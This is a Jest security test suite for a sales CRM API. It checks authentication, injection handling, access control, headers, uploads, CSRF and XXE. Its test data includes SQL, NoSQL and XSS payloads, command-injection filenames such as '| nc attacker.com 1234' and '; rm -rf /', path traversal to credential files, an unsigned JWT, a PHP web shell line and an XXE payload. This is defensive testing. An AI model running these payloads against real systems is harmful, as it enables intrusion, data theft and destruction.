// Security Testing Suite
const TestUtils = require('../helpers/testUtils');

describe('Security Tests', () => {
  let testUtils;
  let authUser;

  beforeAll(async () => {
    testUtils = new TestUtils();
    await testUtils.setup();
    
    authUser = await testUtils.createTestUser({ role: 'sales_rep' });
    await testUtils.apiClient.authenticate(authUser.email, 'TestPassword123!');
  });

  afterAll(async () => {
    await testUtils.cleanup();
  });

  describe('Authentication Security', () => {
    test('should prevent brute force attacks with rate limiting', async () => {
      const results = await testUtils.testRateLimit('/api/auth/login', 10, 60000);
      
      expect(results.rateLimited).toBe(true);
      expect(results.rateLimitResponse).toBeTruthy();
      expect(results.requestsMade).toBeLessThan(20); // Should block before 20 attempts
    });

    test('should enforce strong password requirements', async () => {
      const weakPasswords = [
        'weak',
        '123456',
        'password',
        'abc123',
        'qwerty'
      ];

      for (const password of weakPasswords) {
        const userData = {
          firstName: 'Test',
          lastName: 'User',
          email: testUtils.generateRandomEmail(),
          password,
          role: 'sales_rep'
        };

        const response = await testUtils.apiClient.register(userData);
        expect(response.status).toBe(400);
        expect(response.data.error).toContain('password');
      }
    });

    test('should enforce minimum password length', async () => {
      const userData = {
        firstName: 'Test',
        lastName: 'User',
        email: testUtils.generateRandomEmail(),
        password: '12345', // Too short
        role: 'sales_rep'
      };

      const response = await testUtils.apiClient.register(userData);
      expect(response.status).toBe(400);
      expect(response.data.error).toMatch(/password.*length/i);
    });

    test('should require password complexity', async () => {
      const simplePasswords = [
        'password123', // No uppercase or special chars
        'PASSWORD123', // No lowercase or special chars
        'Password!', // Too short
        'PasswordPassword' // No numbers or special chars
      ];

      for (const password of simplePasswords) {
        const userData = {
          firstName: 'Test',
          lastName: 'User',
          email: testUtils.generateRandomEmail(),
          password,
          role: 'sales_rep'
        };

        const response = await testUtils.apiClient.register(userData);
        expect(response.status).toBe(400);
      }
    });

    test('should implement JWT token expiration', async () => {
      // This test would need a way to simulate expired tokens
      // In a real scenario, you'd either wait for expiration or manipulate system time
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
      
      testUtils.apiClient.setAuthToken(expiredToken);
      const response = await testUtils.apiClient.getLeads();
      
      expect(response.status).toBe(401);
      expect(response.data.error).toMatch(/token.*expired|invalid/i);
    });

    test('should validate JWT token signature', async () => {
      const invalidToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature';
      
      testUtils.apiClient.setAuthToken(invalidToken);
      const response = await testUtils.apiClient.getLeads();
      
      expect(response.status).toBe(401);
      expect(response.data.error).toMatch(/token.*invalid|signature/i);
    });

    test('should prevent session fixation', async () => {
      // Login and get initial token
      const loginResponse = await testUtils.apiClient.login(authUser.email, 'TestPassword123!');
      const initialToken = loginResponse.data.token;
      
      // Logout
      testUtils.apiClient.setAuthToken(initialToken);
      await testUtils.apiClient.logout();
      
      // Try to use the old token
      const response = await testUtils.apiClient.getLeads();
      expect(response.status).toBe(401);
    });
  });

  describe('Input Validation Security', () => {
    test('should prevent SQL injection in lead creation', async () => {
      const maliciousData = {
        companyName: "'; DROP TABLE leads; --",
        contactName: "Robert'; DELETE FROM users; --",
        email: "test@example.com",
        source: "website",
        status: "new"
      };

      const response = await testUtils.apiClient.createLead(maliciousData);
      
      // Should either reject the input or sanitize it safely
      if (response.status === 201) {
        expect(response.data.data.companyName).not.toContain('DROP TABLE');
      } else {
        expect(response.status).toBe(400);
      }
    });

    test('should prevent NoSQL injection in queries', async () => {
      const maliciousQueries = [
        { $ne: null },
        { $regex: '.*' },
        { $where: 'this.password.length > 0' },
        "'; return db.users.find(); var a='"
      ];

      for (const maliciousQuery of maliciousQueries) {
        const response = await testUtils.apiClient.getLeads({
          search: maliciousQuery
        });
        
        // Should handle malicious queries safely
        expect(response.status).toBeLessThan(500);
      }
    });

    test('should sanitize XSS attempts in user input', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>alert(document.cookie)</script>'
      ];

      for (const payload of xssPayloads) {
        const leadData = {
          companyName: payload,
          contactName: 'Test User',
          email: 'test@example.com',
          source: 'website',
          status: 'new',
          notes: payload
        };

        const response = await testUtils.apiClient.createLead(leadData);
        
        if (response.status === 201) {
          // XSS payload should be sanitized or escaped
          const responseData = JSON.stringify(response.data);
          expect(responseData).not.toContain('<script>');
          expect(responseData).not.toContain('onerror=');
          expect(responseData).not.toContain('javascript:');
          
          testUtils.trackTestData('leads', response.data.data.id);
        }
      }
    });

    test('should prevent command injection in file operations', async () => {
      const maliciousFilenames = [
        '; rm -rf /',
        '| nc attacker.com 1234',
        '`whoami`',
        '$(ls -la)',
        '../../../etc/passwd'
      ];

      for (const filename of maliciousFilenames) {
        const response = await testUtils.apiClient.post('/api/files/upload', {
          filename: filename,
          content: 'test content'
        });
        
        // Should reject or sanitize malicious filenames
        expect(response.status).toBeLessThan(500);
        if (response.status >= 400) {
          expect(response.data.error).toMatch(/filename|invalid/i);
        }
      }
    });

    test('should validate email format strictly', async () => {
      const invalidEmails = [
        'plaintext',
        '@missingdomain.com',
        'missing-at-sign.com',
        'spaces @domain.com',
        'double@@domain.com',
        'toolong' + 'a'.repeat(250) + '@domain.com'
      ];

      for (const email of invalidEmails) {
        const leadData = {
          companyName: 'Test Company',
          contactName: 'Test User',
          email: email,
          source: 'website',
          status: 'new'
        };

        const response = await testUtils.apiClient.createLead(leadData);
        expect(response.status).toBe(400);
        expect(response.data.error).toMatch(/email/i);
      }
    });

    test('should prevent path traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await testUtils.apiClient.get(`/api/files/${payload}`);
        
        // Should not allow path traversal
        expect(response.status).not.toBe(200);
        expect(response.status).toBeLessThan(500);
      }
    });
  });

  describe('Authorization Security', () => {
    let adminUser, managerUser, viewerUser;

    beforeEach(async () => {
      adminUser = await testUtils.createTestUser({ role: 'admin' });
      managerUser = await testUtils.createTestUser({ role: 'manager' });
      viewerUser = await testUtils.createTestUser({ role: 'viewer' });
    });

    test('should enforce role-based access control for user management', async () => {
      // Test viewer cannot create users
      await testUtils.apiClient.authenticate(viewerUser.email, 'TestPassword123!');
      
      const newUserData = testUtils.dataFactory.createUser({ role: 'sales_rep' });
      const response = await testUtils.apiClient.createUser(newUserData);
      
      expect(response.status).toBe(403);
      expect(response.data.error).toMatch(/permission|forbidden/i);
    });

    test('should prevent privilege escalation', async () => {
      // Sales rep trying to create admin user
      const adminUserData = testUtils.dataFactory.createUser({ role: 'admin' });
      
      const response = await testUtils.apiClient.createUser(adminUserData);
      expect(response.status).toBe(403);
    });

    test('should prevent horizontal privilege escalation', async () => {
      // Create two sales reps
      const salesRep1 = await testUtils.createTestUser({ role: 'sales_rep' });
      const salesRep2 = await testUtils.createTestUser({ role: 'sales_rep' });
      
      // Create lead owned by salesRep2
      await testUtils.apiClient.authenticate(salesRep2.email, 'TestPassword123!');
      const lead = await testUtils.createTestLead({ assignedTo: salesRep2.id });
      
      // Try to access with salesRep1
      await testUtils.apiClient.authenticate(salesRep1.email, 'TestPassword123!');
      const response = await testUtils.apiClient.getLead(lead.id);
      
      // Should be forbidden or return filtered results
      if (response.status === 200) {
        // If allowed, should only return leads assigned to current user
        expect(response.data.data.assignedTo).toBe(salesRep1.id);
      } else {
        expect(response.status).toBe(403);
      }
    });

    test('should validate JWT token permissions', async () => {
      // Create a malicious JWT token with elevated privileges
      const maliciousToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLWlkIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyfQ.';
      
      testUtils.apiClient.setAuthToken(maliciousToken);
      const response = await testUtils.apiClient.createUser(testUtils.dataFactory.createUser());
      
      expect(response.status).toBe(401);
    });

    test('should prevent IDOR (Insecure Direct Object Reference)', async () => {
      // Create lead with one user
      const lead = await testUtils.createTestLead({ assignedTo: authUser.id });
      
      // Try to access with different user
      const otherUser = await testUtils.createTestUser({ role: 'sales_rep' });
      await testUtils.apiClient.authenticate(otherUser.email, 'TestPassword123!');
      
      const response = await testUtils.apiClient.getLead(lead.id);
      
      // Should either be forbidden or not found
      expect([403, 404]).toContain(response.status);
    });
  });

  describe('Data Protection Security', () => {
    test('should never return password hashes', async () => {
      const response = await testUtils.apiClient.getUser(authUser.id);
      
      expect(response.status).toBe(200);
      expect(response.data.data.password).toBeUndefined();
      expect(response.data.data.passwordHash).toBeUndefined();
      expect(response.data.data.hash).toBeUndefined();
    });

    test('should mask sensitive data in logs', async () => {
      // This would typically check log files or audit trails
      // For now, we ensure sensitive data isn't returned in responses
      
      const loginData = {
        email: authUser.email,
        password: 'TestPassword123!'
      };

      const response = await testUtils.apiClient.login(loginData.email, loginData.password);
      
      // Response should not contain the password
      const responseText = JSON.stringify(response.data);
      expect(responseText).not.toContain('TestPassword123!');
    });

    test('should implement proper session management', async () => {
      // Login and get session
      const loginResponse = await testUtils.apiClient.login(authUser.email, 'TestPassword123!');
      const token = loginResponse.data.token;
      
      // Verify token works
      testUtils.apiClient.setAuthToken(token);
      let response = await testUtils.apiClient.getLeads();
      expect(response.status).toBe(200);
      
      // Logout should invalidate token
      await testUtils.apiClient.logout();
      
      response = await testUtils.apiClient.getLeads();
      expect(response.status).toBe(401);
    });

    test('should prevent sensitive data exposure in error messages', async () => {
      // Try to create user with existing email
      const existingUserData = {
        firstName: 'Test',
        lastName: 'User',
        email: authUser.email, // Duplicate email
        password: 'TestPassword123!',
        role: 'sales_rep'
      };

      const response = await testUtils.apiClient.register(existingUserData);
      
      expect(response.status).toBe(409);
      // Error message should not reveal sensitive information about existing users
      expect(response.data.error).not.toContain(authUser.firstName);
      expect(response.data.error).not.toContain('password');
    });

    test('should implement proper data encryption in transit', async () => {
      // Check if HTTPS is enforced (would need proper setup)
      const response = await testUtils.apiClient.healthCheck();
      
      // Check security headers
      expect(response.headers['strict-transport-security']).toBeTruthy();
      expect(response.headers['content-security-policy']).toBeTruthy();
    });
  });

  describe('API Security Headers', () => {
    test('should include security headers in all responses', async () => {
      const response = await testUtils.apiClient.getLeads();
      
      // Check for security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBeTruthy();
      expect(response.headers['x-xss-protection']).toBeTruthy();
      expect(response.headers['referrer-policy']).toBeTruthy();
    });

    test('should set appropriate CORS headers', async () => {
      const response = await testUtils.apiClient.get('/api/leads', {
        headers: {
          'Origin': 'https://malicious-site.com'
        }
      });

      // Should either block the request or set appropriate CORS headers
      if (response.status === 200) {
        const allowedOrigin = response.headers['access-control-allow-origin'];
        expect(allowedOrigin).not.toBe('*');
        expect(allowedOrigin).not.toBe('https://malicious-site.com');
      }
    });

    test('should implement Content Security Policy', async () => {
      const response = await testUtils.apiClient.healthCheck();
      
      const csp = response.headers['content-security-policy'];
      expect(csp).toBeTruthy();
      expect(csp).toMatch(/script-src/);
      expect(csp).not.toMatch(/unsafe-eval/);
    });
  });

  describe('File Upload Security', () => {
    test('should validate file types', async () => {
      const maliciousFiles = [
        { name: 'script.exe', type: 'application/x-executable' },
        { name: 'malware.bat', type: 'application/x-bat' },
        { name: 'virus.scr', type: 'application/x-screensaver' },
        { name: 'payload.php', type: 'application/x-php' }
      ];

      for (const file of maliciousFiles) {
        const fileBuffer = Buffer.from('malicious content');
        const result = await testUtils.testFileUpload('/api/files/upload', fileBuffer, file.name, file.type);
        
        expect(result.success).toBe(false);
      }
    });

    test('should limit file sizes', async () => {
      const largeFileBuffer = Buffer.alloc(50 * 1024 * 1024); // 50MB
      const result = await testUtils.testFileUpload('/api/files/upload', largeFileBuffer, 'large.pdf', 'application/pdf');
      
      expect(result.success).toBe(false);
    });

    test('should scan file content for malicious patterns', async () => {
      const maliciousContent = `<?php system($_GET['cmd']); ?>`;
      const fileBuffer = Buffer.from(maliciousContent);
      
      const result = await testUtils.testFileUpload('/api/files/upload', fileBuffer, 'innocent.txt', 'text/plain');
      
      // Should detect and block malicious content
      expect(result.success).toBe(false);
    });
  });

  describe('Business Logic Security', () => {
    test('should prevent negative currency values', async () => {
      const leadData = testUtils.dataFactory.createLead({
        dealValue: -10000 // Negative value
      });

      const response = await testUtils.apiClient.createLead(leadData);
      expect(response.status).toBe(400);
      expect(response.data.error).toMatch(/value|amount|negative/i);
    });

    test('should validate business rule constraints', async () => {
      // Try to create a deal with close date in the past
      const dealData = testUtils.dataFactory.createDeal({
        stage: 'closed_won',
        expectedCloseDate: '2020-01-01', // Past date
        actualCloseDate: null
      });

      const response = await testUtils.apiClient.createDeal(dealData);
      
      // Should validate business logic
      if (response.status === 400) {
        expect(response.data.error).toMatch(/date|invalid/i);
      } else {
        // If created, should auto-set actualCloseDate for closed deals
        expect(response.data.data.actualCloseDate).toBeTruthy();
      }
    });

    test('should prevent data manipulation through rate limiting', async () => {
      const results = await testUtils.testRateLimit('/api/leads', 100, 60000);
      
      expect(results.rateLimited).toBe(true);
      expect(results.requestsMade).toBeLessThan(150); // Should rate limit before 150 requests
    });
  });

  describe('Vulnerability Assessment', () => {
    test('should not be vulnerable to CSRF attacks', async () => {
      const csrfResult = await testUtils.testCSRF('/api/leads', 'post', {
        companyName: 'CSRF Test Corp',
        contactName: 'Test User',
        email: 'csrf@test.com',
        source: 'website',
        status: 'new'
      });

      expect(csrfResult.vulnerable).toBe(false);
    });

    test('should handle malformed JSON gracefully', async () => {
      const malformedJsons = [
        '{"incomplete": json',
        '{invalid: "json"}',
        '{"nested": {"deeply": {"malformed": json}}}',
        '{]',
        'not json at all'
      ];

      for (const malformedJson of malformedJsons) {
        const response = await testUtils.apiClient.post('/api/leads', malformedJson, {
          headers: { 'Content-Type': 'application/json' }
        });
        
        expect(response.status).toBe(400);
        expect(response.status).toBeLessThan(500); // Should not cause server errors
      }
    });

    test('should prevent XML External Entity (XXE) attacks', async () => {
      const xxePayload = `<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
          <!ELEMENT foo ANY >
          <!ENTITY xxe SYSTEM "file:///etc/passwd" >
        ]>
        <foo>&xxe;</foo>`;

      const response = await testUtils.apiClient.post('/api/import/xml', xxePayload, {
        headers: { 'Content-Type': 'application/xml' }
      });

      // Should not process external entities
      if (response.status === 200) {
        expect(response.data).not.toContain('root:');
        expect(response.data).not.toContain('/bin/bash');
      } else {
        expect(response.status).toBeLessThan(500);
      }
    });

    test('should implement proper timeout handling', async () => {
      // Test for potential ReDoS (Regular Expression DoS)
      const maliciousInput = 'a'.repeat(10000) + '!';
      
      const start = Date.now();
      const response = await testUtils.apiClient.post('/api/search', {
        query: maliciousInput
      });
      const duration = Date.now() - start;

      // Should not take excessive time to process
      expect(duration).toBeLessThan(5000); // 5 seconds max
      expect(response.status).toBeLessThan(500);
    });
  });

  describe('Compliance and Audit', () => {
    test('should log security events', async () => {
      // Failed login attempt
      const response = await testUtils.apiClient.login('nonexistent@example.com', 'wrongpassword');
      
      expect(response.status).toBe(401);
      // In a real implementation, this would check audit logs
      // For testing, we verify the appropriate error response
      expect(response.data.error).toMatch(/invalid.*credentials/i);
    });

    test('should implement data retention policies', async () => {
      // Create and then try to access very old data
      // This would typically be tested with time manipulation
      const oldLead = await testUtils.createTestLead({
        createdAt: '2020-01-01T00:00:00.000Z'
      });

      const response = await testUtils.apiClient.getLead(oldLead.id);
      
      // Verify data access based on retention policies
      if (response.status === 404) {
        // Data may have been archived or deleted per retention policy
        expect(response.data.error).toMatch(/not found|archived/i);
      } else {
        // Data should still be accessible
        expect(response.status).toBe(200);
      }
    });

    test('should provide audit trail for sensitive operations', async () => {
      // Update user role (sensitive operation)
      await testUtils.apiClient.authenticate(authUser.email, 'TestPassword123!');
      
      const roleUpdate = { role: 'manager' };
      const response = await testUtils.apiClient.updateUser(authUser.id, roleUpdate);
      
      // Should either be forbidden (good) or logged for audit
      if (response.status === 200) {
        // If allowed, should be logged
        expect(response.data.auditLog).toBeTruthy();
      } else {
        expect(response.status).toBe(403);
      }
    });
  });
});